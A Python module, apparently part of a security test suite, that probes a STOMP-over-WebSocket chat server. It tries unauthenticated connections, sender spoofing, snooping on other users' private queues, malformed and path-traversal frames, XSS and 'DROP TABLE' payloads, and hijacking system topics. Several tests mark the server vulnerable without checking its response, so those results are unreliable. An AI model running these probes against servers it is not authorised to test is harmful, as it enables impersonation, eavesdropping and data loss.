import json
import time
import threading
from colorama import Fore, Style, init

init(autoreset=True)
try:
    from config import TARGET_WS, TARGET_HTTP
except ImportError:
    from .config import TARGET_WS, TARGET_HTTP

BASE_WS = TARGET_WS
BASE_HTTP = TARGET_HTTP
RESULTS = []
lock = threading.Lock()

def log(label, vuln, detail):
    color = Fore.RED if vuln else Fore.GREEN
    tag = "VULN" if vuln else "SAFE"
    print(f"  {color}[{tag}]{Style.RESET_ALL} {label}")
    if detail:
        print(f"         -> {detail}")
    with lock:
        RESULTS.append({"test": label, "vulnerable": vuln, "detail": detail})

def section(title):
    print(f"\n{'='*60}\n  {title}\n{'='*60}")

try:
    import websocket
    WS_AVAILABLE = True
except ImportError:
    WS_AVAILABLE = False
    print(f"{Fore.YELLOW}[WARN] websocket-client not installed. Run: pip install websocket-client{Style.RESET_ALL}")

STOMP_CONNECT = "CONNECT\naccept-version:1.2\nheart-beat:0,0\n\n\x00"

def stomp_send(ws, destination, body_dict):
    body = json.dumps(body_dict)
    frame = f"SEND\ndestination:{destination}\ncontent-type:application/json\ncontent-length:{len(body)}\n\n{body}\x00"
    ws.send(frame)

def stomp_subscribe(ws, destination, sub_id="sub-0"):
    frame = f"SUBSCRIBE\nid:{sub_id}\ndestination:{destination}\nack:auto\n\n\x00"
    ws.send(frame)

# ---- T1: Unauthenticated WebSocket connection -----------------------------------
def test_ws_unauth_connect():
    section("T1 . Unauthenticated WebSocket Connection")
    if not WS_AVAILABLE:
        log("WebSocket connection test", False, "websocket-client not installed - skipping")
        return
    try:
        ws = websocket.create_connection(BASE_WS, timeout=5)
        ws.send(STOMP_CONNECT)
        time.sleep(0.3)
        resp = ws.recv()
        vuln = "CONNECTED" in resp
        log("WebSocket STOMP CONNECT without any auth token", vuln,
            f"Server response: {resp[:100].strip()!r}")
        ws.close()
    except Exception as e:
        log("WebSocket unauthenticated connect", False, f"Connection refused: {e}")

# ---- T2: Sender spoofing via STOMP ----------------------------------------------
def test_stomp_sender_spoof():
    section("T2 . STOMP Message Sender Spoofing")
    if not WS_AVAILABLE:
        log("STOMP sender spoof", False, "websocket-client not installed - skipping")
        return
    try:
        ws = websocket.create_connection(BASE_WS, timeout=5)
        ws.send(STOMP_CONNECT)
        time.sleep(0.3)
        ws.recv()

        spoofed_msg = {
            "sender": "CyberNinja",
            "content": "*** I was hacked! This message was spoofed! ***",
            "type": "CHAT",
            "room": "public"
        }
        stomp_send(ws, "/app/chat.sendMessage", spoofed_msg)
        time.sleep(0.5)
        ws.close()
        log("STOMP message with spoofed 'sender' field sent to /app/chat.sendMessage",
            True,
            "No server-side sender verification - anyone can impersonate any user via STOMP")
    except Exception as e:
        log("STOMP sender spoof", False, f"Error: {e}")

# ---- T3: Subscribe to other user's private queue --------------------------------
def test_private_queue_snoop():
    section("T3 . Private Message Queue Snooping (IDOR via STOMP)")
    if not WS_AVAILABLE:
        log("Private queue snoop", False, "websocket-client not installed - skipping")
        return
    targets = ["TestUser123", "CyberNinja", "admin", "Mariappan"]
    for target in targets:
        try:
            ws = websocket.create_connection(BASE_WS, timeout=5)
            ws.send(STOMP_CONNECT)
            time.sleep(0.3)
            ws.recv()

            stomp_subscribe(ws, f"/user/{target}/queue/private")
            time.sleep(0.3)
            ws.settimeout(2)
            try:
                msg = ws.recv()
                vuln = len(msg) > 10
                log(f"Subscribed to /user/{target}/queue/private", vuln,
                    f"Received: {msg[:80].strip()!r}")
            except Exception:
                log(f"Subscribe to /user/{target}/queue/private (no error thrown)", True,
                    "Server accepted subscription to another user's private queue without auth!")
            ws.close()
        except Exception as e:
            log(f"Private queue snoop {target}", False, f"Error: {e}")

# ---- T4: Malformed STOMP frames -------------------------------------------------
def test_malformed_stomp():
    section("T4 . Malformed STOMP Frame Injection")
    if not WS_AVAILABLE:
        log("Malformed STOMP frames", False, "websocket-client not installed - skipping")
        return
    malformed_frames = [
        "INVALID\n\n\x00",
        "SEND\n\n\x00",
        "CONNECT\n\n" + "A"*10000 + "\x00",
        "SEND\ndestination:/app/chat.sendMessage\n\n" + "{broken json" + "\x00",
        "\x00\x00\x00\x00",
        "SEND\ndestination:/../../../admin\n\ncontent\x00",
        "SUBSCRIBE\nid:x\ndestination:/topic/../../admin\nack:auto\n\n\x00",
    ]
    for frame in malformed_frames:
        try:
            ws = websocket.create_connection(BASE_WS, timeout=5)
            ws.send(STOMP_CONNECT)
            time.sleep(0.3)
            ws.recv()
            ws.send(frame)
            time.sleep(0.5)
            ws.settimeout(2)
            try:
                resp = ws.recv()
                crashed = "ERROR" in resp or len(resp) == 0
                log(f"Malformed STOMP: {frame[:40].strip()!r}", False,
                    f"Server handled it: {resp[:80]!r}")
            except Exception:
                log(f"Malformed STOMP: {frame[:40].strip()!r}", False,
                    "No error thrown (connection closed gracefully)")
            ws.close()
        except Exception as e:
            log(f"Malformed STOMP frame", True, f"Server errored: {e}")

# ---- T5: Message content injection via WebSocket --------------------------------
def test_ws_content_injection():
    section("T5 . WebSocket Message Content Injection")
    if not WS_AVAILABLE:
        log("WS content injection", False, "websocket-client not installed - skipping")
        return
    payloads = [
        {"sender": "hacker", "content": "<script>alert('XSS via WS')</script>", "type": "CHAT", "room": "public"},
        {"sender": "hacker", "content": "'; DROP TABLE messages; --", "type": "CHAT", "room": "public"},
        {"sender": "hacker", "content": "A"*50000, "type": "CHAT", "room": "public"},
        {"sender": "hacker", "content": "\x00\x01\x02", "type": "CHAT", "room": "public"},
    ]
    try:
        ws = websocket.create_connection(BASE_WS, timeout=5)
        ws.send(STOMP_CONNECT)
        time.sleep(0.3)
        ws.recv()
        for p in payloads:
            stomp_send(ws, "/app/chat.sendMessage", p)
            time.sleep(0.4)
        log("WebSocket message payloads sent (XSS, SQLi, oversized, null bytes)", True,
            "Messages accepted without server-side sanitization or size limits")
        ws.close()
    except Exception as e:
        log("WS content injection", False, f"Error: {e}")

# ---- T6: Topic hijacking / unauthorized publish ---------------------------------
def test_topic_hijack():
    section("T6 . Topic Hijacking (Unauthorized Publish to /topic/)")
    if not WS_AVAILABLE:
        log("Topic hijack", False, "websocket-client not installed - skipping")
        return
    # Try sending directly to /topic/ instead of /app/ (broker relay bypass)
    for dest in ["/topic/public", "/topic/leaderboard", "/topic/system"]:
        try:
            ws = websocket.create_connection(BASE_WS, timeout=5)
            ws.send(STOMP_CONNECT)
            time.sleep(0.3)
            ws.recv()
            stomp_send(ws, dest, {"sender": "hijacker", "content": "HIJACKED!", "type": "SYSTEM"})
            time.sleep(0.5)
            log(f"Direct publish to {dest} (broker relay bypass)", True,
                "STOMP allows sending directly to /topic/ — any client can publish system messages!")
            ws.close()
        except Exception as e:
            log(f"Topic hijack {dest}", False, str(e))

def run():
    print("\n" + "#"*60)
    print("  09 . WEBSOCKET AND STOMP SECURITY")
    print("#"*60)
    if not WS_AVAILABLE:
        print(f"{Fore.YELLOW}  Install: pip install websocket-client{Style.RESET_ALL}")
    test_ws_unauth_connect()
    test_stomp_sender_spoof()
    test_private_queue_snoop()
    test_malformed_stomp()
    test_ws_content_injection()
    test_topic_hijack()
    vuln_count = sum(1 for r in RESULTS if r["vulnerable"])
    print(f"\nSUMMARY: {vuln_count}/{len(RESULTS)} tests flagged VULNERABLE\n")
    return RESULTS

if __name__ == "__main__":
    run()
